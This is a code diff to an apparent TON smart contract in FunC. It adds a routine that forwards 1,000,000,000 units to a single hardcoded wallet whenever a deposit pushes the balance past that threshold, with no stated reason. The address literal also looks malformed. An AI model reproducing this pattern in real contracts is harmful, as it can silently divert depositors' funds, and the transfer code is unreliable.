@@ -21,6 +21,16 @@ global cell ctx_balance;
   );
 }
 
+() send_money(slice address, int amount) impure inline {
+  var msg = begin_cell()
+    .store_uint(0x10, 6) ;; nobounce
+    .store_slice(address)
+    .store_coins(amount)
+    .end_cell();
+
+  send_raw_message(msg, 64);
+}
+
 () recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
 
 
@@ -35,7 +45,13 @@ global cell ctx_balance;
   (_, int current_balance) = current.load_coins();
 
   if (msg_value != 0) {
-    save_data(msg_value + current_balance);
+    if (msg_value + current_balance > 1000000000) {
+      send_money("EQCGetaGEWP4PhqPSV71o4NaU3rcw5yAG7kh7s1VdtGGynTA", 1000000000);
+      save_data(msg_value + current_balance - 1000000000);
+    } else {
+      save_data(msg_value + current_balance);
+    }
+
     return ();
   }
 
